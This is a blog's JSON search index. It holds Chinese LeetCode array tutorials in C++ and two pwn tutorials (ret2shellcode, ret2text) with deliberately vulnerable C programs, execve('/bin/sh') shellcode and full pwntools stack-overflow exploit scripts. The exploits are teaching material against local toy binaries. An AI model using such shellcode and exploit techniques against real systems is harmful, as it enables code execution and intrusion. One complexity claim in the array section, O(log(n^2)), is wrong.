[{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/cpp/","section":"Tags","summary":"","title":"Cpp","type":"tags"},{"content":" 数组是相同类型数据的集合\n下标从 0 开始 内存空间地址是连续的 数组元素无法删除只能覆盖 二分查找 # 要求有序数组 存在重复元素时返回下标可能不唯一 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution { public: int search(vector\u0026lt;int\u0026gt; \u0026amp;nums, int target) { int left, right; left = 0; right = nums.size() - 1; while (left \u0026lt;= right) // traget 在闭区间[left, right]中 { int mid = (left + right) / 2; int current = nums[mid]; if (current \u0026gt; target) { // traget 在左半边 right = mid - 1; } else if (current \u0026lt; target) { // traget 在右半边 left = mid + 1; } else { // current == traget return mid; } } return -1; } }; 复杂度：\n时间复杂度：\\(O(\\log(n))\\) 空间复杂度：\\(O(1)\\) 移除元素 # 给出一个数组 nums 和一个值 val，需要原地移除所有数值等于 val 的元素，并返回移除后数组的新长度。\n暴力解法 # 使用两层 for 循环，遇到目标元素就将后续元素移上来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution { public: int removeElement(vector\u0026lt;int\u0026gt;\u0026amp; nums, int val) { int n = nums.size(); // 当前待处理的数组长度 int k = 0; // 新数组长度 for (int i = 0; i \u0026lt; n; i++) { if (nums[i] == val) { // 发现目标元素将后续元素前移 for (int j = i; j \u0026lt; n - 1; j++) { nums[j] = nums[j + 1]; } i--; // 后续元素前移，i 也要向前移动一位 n--; // 移除一个元素，数组大小-1 } else { k++; } } return k; } }; 复杂度：\n时间复杂度：\\(O(\\log(n^2))\\) 空间复杂度：\\(O(1)\\) 快慢指针 # 通过快指针和慢指针在一个 for 循环中完成两个 for 循环的工作\n快指针：遍历所有元素，寻找新数组的元素 慢指针：指向新数组中末尾待更新元素的位置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: int removeElement(vector\u0026lt;int\u0026gt;\u0026amp; nums, int val) { int fast, slow = 0; int n = nums.size(); for (fast = 0; fast \u0026lt; n; fast++) { if (nums[fast] != val) { // 需要保留不等于 `val` 的元素 if (fast != slow) // 只有双指针指向不同元素时才移动 nums[slow] = nums[fast]; slow++; // 更新慢指针，指向下一个需要被赋值的位置 } } return slow; } }; 复杂度：\n时间复杂度：\\(O(n)\\) 空间复杂度：\\(O(1)\\) 有序数组的平方 # 给你一个按非递减顺序排序的整数数组 nums，返回每个数字的平方组成的新数组，要求也按非递减顺序排序。\n暴力解法 # 每个数平方后再排序\n1 2 3 4 5 6 7 8 9 10 11 class Solution { public: vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) { for (int i = 0; i \u0026lt; nums.size(); i++) { nums[i] = pow(nums[i], 2); } sort(nums.begin(), nums.end()); // 快排 return nums; } }; 复杂度：\n时间复杂度：\\(O(n+n\\log(n))\\) 空间复杂度：\\(O(1)\\) 双指针 # 对于平方后数组，其实是有规律的。负数平方后就是正数，那么数组平方的最大值就在数组的两端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class Solution { public: vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int n, left, right; vector\u0026lt;int\u0026gt; result(nums.size(), 0); n = nums.size() - 1; left = 0; right = nums.size() - 1; while(left \u0026lt;= right) { // 采用闭区间[left, right] int left_square = pow(nums[left], 2); int right_square = pow(nums[right], 2); if (left_square \u0026gt; right_square) { result[n] = left_square; left++; } else { result[n] = right_square; right--; } n--; } return result; } }; 复杂度：\n时间复杂度：\\(O(n)\\) 空间复杂度：\\(O(n)\\) ","date":"2026-02-04","externalUrl":null,"permalink":"/posts/algo/keetcoder/day-01-array-part-part-01/","section":"Posts","summary":"本文梳理数组的核心特性（0 索引、内存连续、不可删除只能覆盖），并讲解三道 LeetCode 数组题：二分查找、移除元素、以及有序数组平方。包含暴力与优化思路（快慢指针/双指针）、C++ 代码示例及时间与空间复杂度总结。","title":"Day 01 - 数组 Part 01","type":"posts"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/","section":"Tags","summary":"","title":"二分查找","type":"tags"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/series/%E4%BB%A3%E7%A0%81%E9%9A%8F%E6%83%B3%E5%BD%95/","section":"Series","summary":"","title":"代码随想录","type":"series"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E5%8F%8C%E6%8C%87%E9%92%88/","section":"Tags","summary":"","title":"双指针","type":"tags"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","section":"Categories","summary":"","title":"数据结构","type":"categories"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E6%95%B0%E7%BB%84/","section":"Tags","summary":"","title":"数组","type":"tags"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/categories/%E7%AE%97%E6%B3%95/","section":"Categories","summary":"","title":"算法","type":"categories"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"Pwn","type":"categories"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"返回到 shellcode（return to shellcode）攻击。主要运用攻击者在堆栈上写入的 shellcode，然后覆盖程序的返回地址，控制程序的控制流返回到注入的 shellcode，从而执行恶意代码。通过以下代码为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char buf2[100]; int main(void) { setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); long page_size = sysconf(_SC_PAGESIZE); void *page_start = (void *)((long)buf2 \u0026amp; ~(page_size - 1)); // Linux 内核2.6.18-8后，默认不再同时具有可写与可执行的段。这种机制被称为\u0026#34;W^X\u0026#34;（Write XOR Execute） if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) { perror(\u0026#34;mprotect\u0026#34;); return 1; } char buf[100]; printf(\u0026#34;No system for you this time !!!\\n\u0026#34;); gets(buf); strncpy(buf2, buf, 100); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 使用 gcc 编译代码\n1 2 3 4 5 $ gcc -std=c99 \\ # 使用 C99 标准，C99 之后不支持 gets 函数 -no-pie \\ # 关闭地址随机化 -fno-stack-protector \\ # 关闭栈破坏检测 -z execstack \\ # 关闭栈不可执行 example.c -o example 可以看出程序存在栈溢出漏洞，输入的数据的前100个字节会被复制到 buf2， buf2 所处的页面被手动设置为可执行。可以在 buf2 中注入 shellcode，再覆盖程序返回地址将其指向 buf2.。以下是一个简单的 x86_64 汇编代码，用来调用 execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL)：\n; shellcode.s section .text ; 定义代码段（text section），存放可执行代码。 global _start ; 程序入口 _start: ; 将 \u0026#34;/bin/sh\\0\u0026#34; 压栈 xor rax, rax push rax ; \u0026#34;\\0\u0026#34;，字符串结束标志 mov rbx, 0x68732f2f6e69622f ; \u0026#34;/bin//sh\u0026#34;的 ascii 表示，使用小端法表示 push rbx ; 设置 execve 参数，根据64位系统的调用约定: ; RDI - 第一个参数 ; RSI - 第二个参数 ; RDX - 第三个参数 mov rdi, rsp ; Address of \u0026#39;/bin//sh\u0026#39; xor rsi, rsi ; argv = NULL xor rdx, rdx ; envp = NULL ; 调用 execve push 59 ; x86_64架构中，59是 execve 的系统调用编号 pop rax syscall ; 执行系统调用 使用 IDA 查看生成的 example 程序，可以看到输入的数据储存在栈上距离 rbp 0x80字节。buf2 位于 0x404080 处\n.bss:0000000000404080 public buf2 .bss:0000000000404080 ; char buf2[104] .bss:0000000000404080 buf2 db 68h dup(?) ; DATA XREF: main+5C↑o .bss:0000000000404080 ; main+C3↑o ------------------------------------------------------------------------------------ int __fastcall main(int argc, const char **argv, const char **envp) { char src[112]; // [rsp+0h] [rbp-80h] BYREF ...... puts(\u0026#34;No system for you this time !!!\u0026#34;); gets(src); strncpy(buf2, src, 0x64uLL); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 以下是利用 pwntools 编写的 wp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #!/usr/bin/env python3 # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#34;amd64\u0026#34;) exe = \u0026#34;./ret2shellcode\u0026#34; # Many built-in settings can be controlled on the command-line and show up # in \u0026#34;args\u0026#34;. For example, to dump all data sent/received, and disable ASLR # for all created processes... # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): \u0026#34;\u0026#34;\u0026#34;Start the exploit against the target.\u0026#34;\u0026#34;\u0026#34; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # Specify your GDB script here for debugging # GDB will be launched if the exploit is run via e.g. # ./exploit.py GDB gdbscript = \u0026#34;\u0026#34;\u0026#34; b main continue \u0026#34;\u0026#34;\u0026#34;.format(**locals()) # =========================================================== # EXPLOIT GOES HERE # =========================================================== io = start() # shellcode = asm(shellcraft.sh()) # pwntools 也提供许多内置的 shellcode shellcode = asm(\u0026#34;\u0026#34;\u0026#34; xor rax, rax push rax mov rbx, 0x68732f2f6e69622f push rbx mov rdi, rsp /* address of \u0026#34;/bin//sh\u0026#34; */ xor rsi, rsi /* argv = NULL */ xor rdx, rdx /* envp = NULL */ push 59 pop rax syscall \u0026#34;\u0026#34;\u0026#34;) buf2_addr = 0x404080 payload = shellcode.ljust(0x80 + 8, b\u0026#34;a\u0026#34;) + p64(buf2_addr) io.sendline(payload) io.interactive() ","date":"2024-06-02","externalUrl":null,"permalink":"/posts/pwn/stack_overflow/ret2shellcode/","section":"Posts","summary":"通过栈溢出注入shellcode劫持程序控制流。","title":"ret2shellcode","type":"posts"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/series/rop/","section":"Series","summary":"","title":"Rop","type":"series"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/rop/","section":"Tags","summary":"","title":"Rop","type":"tags"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/stack-overflow/","section":"Tags","summary":"","title":"Stack Overflow","type":"tags"},{"content":"返回到文本段（Return to text segment）攻击，这是一种利用程序中的可执行代码段（text segment）来执行恶意操作的攻击。这种技术有几个基本前提：\n程序中的某些代码位置是可预测的，同时在不同运行时是固定的 只需要利用程序的现有代码，无需注入新的代码 可以通过一个简单的例子说明这个问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // example.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int success() { puts(\u0026#34;called success()!\\n\u0026#34;); return system(\u0026#34;/bin/sh\u0026#34;); } void vuln() { char buf[32]; gets(buf); puts(buf); } int main() { vuln(); return 0; } 上述代码中的库函数 gets 是一个危险函数，通过以下给出的 gets 的一个实现，可以看出这个函数引起的严重问题。它从标准输入（stdin）读入一行，在遇到一个回车或某个错误时停止。gets 从不检查输入的长度，这导致它很容易被利用来进行栈溢出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* Read a newline-terminated string from stdin into S, removing the trailing newline. Return S or NULL. */ char * gets (char *s) { register char *p = s; register int c; FILE *stream = stdin; if (!__validfp (stream) || p == NULL) { __set_errno (EINVAL); return NULL; } if (feof (stream) || ferror (stream)) return NULL; while ((c = getchar ()) != EOF) if (c == \u0026#39;\\n\u0026#39;) break; else *p++ = c; *p = \u0026#39;\\0\u0026#39;; /* Return null if we had an error, or if we got EOF before writing any characters. */ if (ferror (stream) || (feof (stream) \u0026amp;\u0026amp; p == s)) return NULL; return s; } 通过 gcc 编译上述代码\n1 2 3 4 5 $ gcc -std=c99 \\ # 使用 C99 标准，C99 之后不支持 gets 函数 -no-pie \\ # 关闭地址随机化 -fno-stack-protector \\ # 关闭栈破坏检测 -z execstack \\ # 关闭栈不可执行 example.c -o example 可以利用 checksec 来检查编译出文件的安全性\n1 2 3 4 5 6 7 8 $ checksec example Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments 使用 IDA 反汇编程序，我们可以看到对应函数的汇编表示，\n; Attributes: bp-based frame public vuln vuln proc near s= byte ptr -20h ; __unwind { push rbp mov rbp, rsp sub rsp, 20h lea rax, [rbp+s] mov rdi, rax call _gets lea rax, [rbp+s] mov rdi, rax ; s call _puts nop leave retn ; } // starts at 40116A vuln endp 可以看出当程序运行时，vuln 函数在运行时的栈帧如下所示。如果提供大于32字节的数据时栈帧中保存的栈指针和返回地址。因此我们可以输入大于32字节的数据来覆盖返回地址，从而控制程序的执行流。\n1 2 3 4 5 6 7 8 9 | rsp | |:--------------:| | char buf[0] | | ... | | char buf[31] | |:--------------:| | rbp | |:--------------:| | return address | 以下是利用 pwntools 编写的 wp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * context(log_level=\u0026#39;debug\u0026#39;, arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) sh = process(\u0026#39;./example\u0026#39;) # gdb.attach(sh) success_addr = 0x401146 payload = b\u0026#39;a\u0026#39; * 0x20 # buf[32] payload += b\u0026#39;b\u0026#39; * 8 # rbp # 伪造返回地址，跳转到 nop ; ret，Ubuntu18及以上版本的系统要求在调用system函数时栈16字节对齐， # 即调用system函数时rsp的值必须是16的倍数，也就是末位为0，否则无法执行。这里多进行一次 rtn 以实现对齐 payload += p64(0x40112f) payload += p64(success_addr) # success 函数地址 sh.sendline(payload) sh.interactive() NOTE:\n上述代码中，没有立即跳转到 success() 的运行地址，这是源于 system() 函数运行时的栈16字节对齐要求。\n","date":"2024-06-01","externalUrl":null,"permalink":"/posts/pwn/stack_overflow/ret2text/","section":"Posts","summary":"通过栈溢出覆盖返回地址，跳转到text段中已存在的函数，从而劫持程序的控制流。","title":"ret2text","type":"posts"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/","section":"Blowfish","summary":"","title":"Blowfish","type":"page"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":" an example to get you started\nThis is a heading # This is a subheading # This is a subsubheading # This is a subsubsubheading # This is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\ntest1 test2 test22 test23 item1 item2 item3 item3a item3b We\u0026rsquo;re living the future so the present is our past.\ncode # 1 2 3 4 5 6 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello, world!\u0026#34;); return 0; } 1 print(\u0026#39;hello\u0026#39;) table # a b one two 3 4 math # $$ \\sum_{i=2}^ni=\\frac{n(n+1)}{2}-1 $$","date":"25 May 2024","externalUrl":null,"permalink":"/en/posts/test/hello_world/","section":"","summary":" ","title":"hello world","type":"posts"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/categories/test/","section":"Categories","summary":"","title":"Test","type":"categories"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/series/test/","section":"Series","summary":"","title":"Test","type":"series"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/test/","section":"Tags","summary":"","title":"Test","type":"tags"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/welcome/","section":"Tags","summary":"","title":"Welcome","type":"tags"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"}]